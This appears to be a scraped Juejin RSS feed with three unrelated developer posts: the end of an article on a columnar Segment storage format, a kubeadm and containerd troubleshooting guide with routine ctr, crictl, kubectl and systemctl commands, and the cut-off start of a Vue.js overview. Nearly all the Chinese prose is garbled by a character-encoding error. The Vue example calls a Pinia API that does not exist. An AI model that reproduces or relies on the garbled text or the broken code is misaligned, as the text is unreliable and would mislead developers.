<h3 data-id="heading-74">11.1 æ ¸å¿ƒè¦ç‚¹</h3>
<ol>
<li>
<p><strong>Segment æ–‡ä»¶æ ¼å¼</strong>ï¼š</p>
<ul>
<li>åˆ—å¼å­˜å‚¨ï¼Œæ¯åˆ—ç‹¬ç«‹å­˜å‚¨</li>
<li>Footer åœ¨æ–‡ä»¶æœ«å°¾ï¼ŒåŒ…å«å…ƒæ•°æ®</li>
<li>æ”¯æŒ Checksum æ ¡éªŒå’Œ Magic Number éªŒè¯</li>
</ul>
</li>
<li>
<p><strong>Page ç»“æ„</strong>ï¼š</p>
<ul>
<li>åŸºæœ¬å­˜å‚¨å•å…ƒï¼Œé»˜è®¤ 64KB</li>
<li>åŒ…å«ç¼–ç æ•°æ®ã€NULL ä½å›¾ã€Footer</li>
<li>æ”¯æŒå‹ç¼©å’Œé¢„è§£ç </li>
</ul>
</li>
<li>
<p><strong>åˆ—ç¼–ç </strong>ï¼š</p>
<ul>
<li><strong>Plain</strong>ï¼šç›´æ¥å­˜å‚¨ï¼Œé€‚åˆæ•°å€¼ç±»å‹</li>
<li><strong>Dictionary</strong>ï¼šå­—å…¸ç¼–ç ï¼Œé€‚åˆä½åŸºæ•°åˆ—</li>
<li><strong>RLE</strong>ï¼šæ¸¸ç¨‹ç¼–ç ï¼Œé€‚åˆè¿ç»­é‡å¤å€¼</li>
<li><strong>BitShuffle</strong>ï¼šä½é‡æ’ï¼Œæé«˜å‹ç¼©ç‡</li>
</ul>
</li>
<li>
<p><strong>ç´¢å¼•ç±»å‹</strong>ï¼š</p>
<ul>
<li><strong>Ordinal Index</strong>ï¼šè¡Œå·å®šä½ï¼Œå¿…å¤‡</li>
<li><strong>Zone Map</strong>ï¼šMin/Max è¿‡æ»¤ï¼Œå¿…å¤‡</li>
<li><strong>Bloom Filter</strong>ï¼šå€¼å­˜åœ¨æ€§åˆ¤æ–­ï¼Œé«˜åŸºæ•°åˆ—</li>
<li><strong>Bitmap Index</strong>ï¼šå€¼â†’è¡Œå·æ˜ å°„ï¼Œä½åŸºæ•°åˆ—</li>
</ul>
</li>
<li>
<p><strong>å†™å…¥æµç¨‹</strong>ï¼š</p>
<ul>
<li>init() â†’ append_data() â†’ finish() â†’ write_data() â†’ write_indexes() â†’ write_footer()</li>
<li>æ¯ä¸ªåˆ—ç‹¬ç«‹å†™å…¥ï¼Œäº’ä¸å½±å“</li>
<li>æ”¯æŒå¤šç§ç´¢å¼•åŒæ—¶æ„å»º</li>
</ul>
</li>
</ol>
<h3 data-id="heading-75">11.2 æœ€ä½³å®è·µ</h3>
<ol>
<li>
<p><strong>ç¼–ç é€‰æ‹©</strong>ï¼š</p>
<ul>
<li>ä½åŸºæ•°å­—ç¬¦ä¸²åˆ—ä½¿ç”¨ Dictionary Encoding</li>
<li>æ•°å€¼åˆ—ä½¿ç”¨ BitShuffle + LZ4</li>
<li>æ’åºåˆ—è€ƒè™‘ RLE æˆ– FOR Encoding</li>
</ul>
</li>
<li>
<p><strong>ç´¢å¼•é…ç½®</strong>ï¼š</p>
<ul>
<li>Zone Map é»˜è®¤å¯ç”¨ï¼Œæ— éœ€æ‰‹åŠ¨é…ç½®</li>
<li>ä½åŸºæ•°åˆ—ï¼ˆ&lt; 10000ï¼‰å»ºç«‹ Bitmap Index</li>
<li>é«˜é€‰æ‹©æ€§åˆ—å»ºç«‹ Bloom Filter</li>
<li>é¿å…åœ¨æ‰€æœ‰åˆ—ä¸Šéƒ½å»ºç«‹ç´¢å¼•</li>
</ul>
</li>
<li>
<p><strong>å‹ç¼©é…ç½®</strong>ï¼š</p>
<ul>
<li>é»˜è®¤ä½¿ç”¨ LZ4</li>
<li>å­˜å‚¨æ•æ„Ÿåœºæ™¯ä½¿ç”¨ ZSTD</li>
<li>è€ƒè™‘å‹ç¼©ç‡é˜ˆå€¼ï¼ˆmin_space_savingï¼‰</li>
</ul>
</li>
<li>
<p><strong>Page å¤§å°</strong>ï¼š</p>
<ul>
<li>é»˜è®¤ 64KB é€‚åˆå¤§å¤šæ•°åœºæ™¯</li>
<li>å° Pageï¼šæé«˜ç²’åº¦ï¼Œå¢åŠ ç´¢å¼•å¼€é”€</li>
<li>å¤§ Pageï¼šé™ä½ç´¢å¼•å¼€é”€ï¼Œå¢åŠ å†…å­˜å ç”¨</li>
</ul>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[kubeadm éƒ¨ç½²é—®é¢˜æ’æŸ¥]]></title>    <link>https://juejin.cn/post/7592531796044775439</link>    <guid>https://juejin.cn/post/7592531796044775439</guid>    <pubDate>2026-01-08T05:19:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592531796044775439" data-draft-id="7358421612230639616" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="kubeadm éƒ¨ç½²é—®é¢˜æ’æŸ¥"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-08T05:19:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çŒ¹æ–¯"/> <meta itemprop="url" content="https://juejin.cn/user/3747604251815016"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            kubeadm éƒ¨ç½²é—®é¢˜æ’æŸ¥
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3747604251815016/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çŒ¹æ–¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T05:19:23.000Z" title="Thu Jan 08 2026 05:19:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><pre><code class="hljs language-text" lang="text"># helm ä¸‹è½½
wget -q https://get.helm.sh/helm-v3.14.3-linux-amd64.tar.gz
</code></pre>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">#</span><span class="bash">k8sé•œåƒå¯¼å‡º</span>
ctr -n k8s.io images export --skip-manifest-json kube-apiserver:v1.29.3.tar registry.k8s.io/kube-apiserver:v1.29.3
ctr -n k8s.io images export --skip-manifest-json kube-controller-manager:v1.29.3.tar registry.k8s.io/kube-controller-manager:v1.29.3
ctr -n k8s.io images export --skip-manifest-json kube-scheduler:v1.29.3.tar registry.k8s.io/kube-scheduler:v1.29.3
ctr -n k8s.io images export --skip-manifest-json kube-proxy:v1.29.3.tar registry.k8s.io/kube-proxy:v1.29.3
ctr -n k8s.io images export --skip-manifest-json coredns:v1.11.1.tar registry.k8s.io/coredns/coredns:v1.11.1
ctr -n k8s.io images export --skip-manifest-json pause:3.9.tar registry.k8s.io/pause:3.9
ctr -n k8s.io images export --skip-manifest-json etcd:3.5.12-0.tar registry.k8s.io/etcd:3.5.12-0
ctr -n k8s.io images export --skip-manifest-json flannel-cni-plugin.tar docker.io/flannel/flannel-cni-plugin:v1.4.0-flannel1
ctr -n k8s.io images export --skip-manifest-json flannel:v0.24.4.tar docker.io/flannel/flannel:v0.24.4
</code></pre>
<h2 data-id="heading-0">k8s ç¯å¢ƒéƒ¨ç½²å‡ºé”™</h2>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹kubeadm éœ€è¦çš„é•œåƒæ–‡ä»¶</span>
$ kubeadm config image list
registry.k8s.io/kube-apiserver:v1.29.3
registry.k8s.io/kube-controller-manager:v1.29.3
registry.k8s.io/kube-scheduler:v1.29.3
registry.k8s.io/kube-proxy:v1.29.3
registry.k8s.io/coredns/coredns:v1.11.1
registry.k8s.io/pause:3.9
registry.k8s.io/etcd:3.5.12-0
</code></pre>
<h4 data-id="heading-1">1. æ£€æŸ¥ containerd éƒ¨ç½²æ˜¯å¦æ­£å¸¸</h4>
<p>containerd é…ç½®æ–‡ä»¶ä½ç½® <code>/etc/containerd/config.toml</code></p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">æŸ¥çœ‹ containerd ç‰ˆæœ¬</span>
<span class="hljs-meta prompt_">$ </span><span class="bash">containerd -v æˆ–è€… ctr -v</span>
<span class="hljs-meta prompt_">
# </span><span class="bash">æŸ¥çœ‹ containerd çŠ¶æ€</span>
<span class="hljs-meta prompt_">$ </span><span class="bash">systemctl status containerd</span>
<span class="hljs-meta prompt_">
# </span><span class="bash">æŸ¥çœ‹ containerd çš„å¯åœæ²™ç®±</span>
<span class="hljs-meta prompt_">$ </span><span class="bash">grep sandbox_image /etc/containerd/config.toml</span>
<span class="hljs-meta prompt_">&gt; </span><span class="bash">   sandbox_image = <span class="hljs-string">"registry.k8s.io/pause:3.9"</span></span>
<span class="hljs-meta prompt_">
# </span><span class="bash">æŸ¥çœ‹ containerd æ˜¯å¦å¯ç”¨ç³»ç»Ÿè°ƒåº¦</span>
<span class="hljs-meta prompt_">$ </span><span class="bash">grep SystemdCgroup /etc/containerd/config.toml</span>
<span class="hljs-meta prompt_">&gt; </span><span class="bash">            SystemdCgroup = <span class="hljs-literal">true</span></span>
</code></pre>
<p>containerd é‡å¯</p>
<pre><code class="hljs language-shell" lang="shell">systemctl daemon-reload
systemctl disable containerd
systemctl enable containerd
systemctl restart containerd
</code></pre>
<h4 data-id="heading-2">2. æ£€æŸ¥é•œåƒåŠ è½½æ˜¯å¦æ­£å¸¸</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">$ </span><span class="bash">ctr -n k8s.io images <span class="hljs-built_in">ls</span>|awk <span class="hljs-string">'{print $1}'</span>|grep -v sha256</span>
REF
docker.io/flannel/flannel-cni-plugin:v1.4.0-flannel1
docker.io/flannel/flannel:v0.24.4
registry.k8s.io/coredns/coredns:v1.11.1
registry.k8s.io/etcd:3.5.12-0
registry.k8s.io/kube-apiserver:v1.29.3
registry.k8s.io/kube-controller-manager:v1.29.3
registry.k8s.io/kube-proxy:v1.29.3
registry.k8s.io/kube-scheduler:v1.29.3
registry.k8s.io/pause:3.8
registry.k8s.io/pause:3.9
</code></pre>
<h4 data-id="heading-3">3. æ£€æŸ¥ crictl ç¯å¢ƒæ˜¯å¦æ­£å¸¸</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹crictl version</span>
$ crictl --version
&gt;crictl version v1.28.0

<span class="hljs-comment"># æŸ¥çœ‹ crictl é…ç½®</span>
<span class="hljs-built_in">cat</span> /etc/crictl.yaml
&gt;runtime-endpoint: unix:///run/containerd/containerd.sock
&gt;image-endpoint: unix:///run/containerd/containerd.sock
&gt;<span class="hljs-built_in">timeout</span>: 10
&gt;debug: <span class="hljs-literal">false</span>
&gt;pull-image-on-create: <span class="hljs-literal">false</span>

<span class="hljs-comment"># æŸ¥çœ‹æ˜¯å¦èƒ½è¿æ¥åˆ° containerd</span>
$ crictl --image-endpoint=unix:///run/containerd/containerd.sock images <span class="hljs-built_in">ls</span>
IMAGE                                     TAG                 IMAGE ID            SIZE
docker.io/flannel/flannel-cni-plugin      v1.4.0-flannel1     77c1250c26d96       4.5MB
docker.io/flannel/flannel                 v0.24.4             c9fe3bce8a6d8       32.7MB
registry.k8s.io/coredns/coredns           v1.11.1             cbb01a7bd410d       18.2MB
registry.k8s.io/etcd                      3.5.12-0            3861cfcd7c04c       57.2MB
registry.k8s.io/kube-apiserver            v1.29.3             39f995c9f1996       35.1MB
registry.k8s.io/kube-controller-manager   v1.29.3             6052a25da3f97       33.5MB
registry.k8s.io/kube-proxy                v1.29.3             a1d263b5dc5b0       28.4MB
registry.k8s.io/kube-scheduler            v1.29.3             8c390d98f50c0       18.6MB
registry.k8s.io/pause                     3.8                 4873874c08efc       311kB
registry.k8s.io/pause                     3.9                 e6f1816883972       322kB
</code></pre>
<h4 data-id="heading-4">4. æ£€æŸ¥ kubelet æ—¥å¿—é—®é¢˜</h4>
<p>kubelet é‡å¯</p>
<pre><code class="hljs language-shell" lang="shell">systemctl daemon-reload
systemctl disable kubelet
systemctl enable kubelet
systemctl restart kubelet
</code></pre>
<h4 data-id="heading-5">5. æ£€æŸ¥å‘å¸ƒå¤±è´¥çš„ kubeadm é…ç½®ä¿¡æ¯</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">$ </span><span class="bash"><span class="hljs-built_in">cat</span> /var/lib/kubelet/kubeadm-flags.env</span>
KUBELET_KUBEADM_ARGS="--container-runtime-endpoint=unix:///run/containerd/containerd.sock --hostname-override=k8s-master --pod-infra-container-image=registry.k8s.io/pause:3.9"
</code></pre>
<h2 data-id="heading-6">å¼‚å¸¸é—®é¢˜è®°è½½åŠè§£å†³åŠæ³•</h2>
<h4 data-id="heading-7">kubelet å¯åŠ¨å¤±è´¥</h4>
<p>æŸ¥çœ‹è¿›ç¨‹æ—¥å¿—</p>
<pre><code class="hljs language-shell" lang="shell">journalctl -u kubelet # æŸ¥çœ‹Unitæ—¥å¿—
æˆ–è€…
grep SandboxImage /var/log/messages
æˆ–è€…
less /var/log/message
</code></pre>
<h4 data-id="heading-8">æœåŠ¡Pod ä¸€ç›´å¤„äºpending</h4>
<p>æŸ¥çœ‹æœåŠ¡å¯åŠ¨ç¡®å®šåŸå› </p>
<pre><code class="hljs language-shell" lang="shell"> kubectl -n bdtp describe pod/bdtp-portal-86b7789c75-ffqf6
</code></pre>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹èŠ‚ç‚¹ä¿¡æ¯</span>
kubectl get nodes --show-labels

kubectl describe nodes k8s-slave1 | grep Taints
Taints:             drunk=<span class="hljs-literal">true</span>:NoSchedule

<span class="hljs-comment"># åˆ é™¤k8sæ±¡ç‚¹ä¿¡æ¯</span>
kubectl taint node k8s-master node.kubernetes.io/not-ready-
kubectl taint node k8s-master node-role.kubernetes.io/control-plane-
</code></pre>
<h4 data-id="heading-9">ç½‘ç»œé—®é¢˜å¼•èµ·çš„å®¹å™¨æ— æ³•è°ƒåº¦æˆ–è€…è®¿é—®</h4>
<p>éœ€è¦é‡æ–°å®‰è£…flannal</p>
<pre><code class="hljs language-shell" lang="shell">kubectl apply -f ./kube-flannel.yml
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue.jsçš„ä¼˜ç‚¹]]></title>    <link>https://juejin.cn/post/7592816646853836850</link>    <guid>https://juejin.cn/post/7592816646853836850</guid>    <pubDate>2026-01-08T03:06:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592816646853836850" data-draft-id="7592552501579710490" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue.jsçš„ä¼˜ç‚¹"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js"/> <meta itemprop="datePublished" content="2026-01-08T03:06:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ»¡å¤©æ˜Ÿè¾°"/> <meta itemprop="url" content="https://juejin.cn/user/2771198801097485"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue.jsçš„ä¼˜ç‚¹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2771198801097485/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ»¡å¤©æ˜Ÿè¾°
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:06:09.000Z" title="Thu Jan 08 2026 03:06:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    13
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Vue.js æ˜¯ä¸€ä¸ªæ¸è¿›å¼JavaScriptæ¡†æ¶ï¼Œå…·æœ‰ä»¥ä¸‹ä¸»è¦ä¼˜ç‚¹ï¼š</p>
<h2 data-id="heading-0">Vue æ¡†æ¶è®¾è®¡çš„æ ¸å¿ƒä¼˜ç‚¹</h2>
<h3 data-id="heading-1">ğŸ—ï¸Â <strong>æ¶æ„è®¾è®¡å±‚é¢</strong></h3>
<h4 data-id="heading-2">1.Â <strong>æ¸è¿›å¼æ¶æ„è®¾è®¡</strong></h4>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¯ä»¥é€æ­¥é‡‡ç”¨ Vue çš„åŠŸèƒ½</span>
<span class="hljs-comment">// 1. ä½œä¸ºè§†å›¾å±‚åº“ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> app = <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">createApp</span>({ <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> { <span class="hljs-attr">message</span>: <span class="hljs-string">'Hello'</span> } } })

<span class="hljs-comment">// 2. æ·»åŠ è·¯ç”±</span>
<span class="hljs-keyword">const</span> router = <span class="hljs-title class_">VueRouter</span>.<span class="hljs-title function_">createRouter</span>({ ... })

<span class="hljs-comment">// 3. æ·»åŠ çŠ¶æ€ç®¡ç†</span>
<span class="hljs-keyword">const</span> store = <span class="hljs-title class_">Pinia</span>.<span class="hljs-title function_">createStore</span>({ ... })
</code></pre>
<h4 data-id="heading-3">2.Â <strong>å“åº”å¼ç³»ç»Ÿçš„åˆ›æ–°è®¾è®¡</strong></h4>
<p>javascript</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// Vue 3 åŸºäº Proxy çš„å“åº”å¼</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">state</span> = <span class="hljs-title function_ invoke__">reactive</span>({ 
  <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,
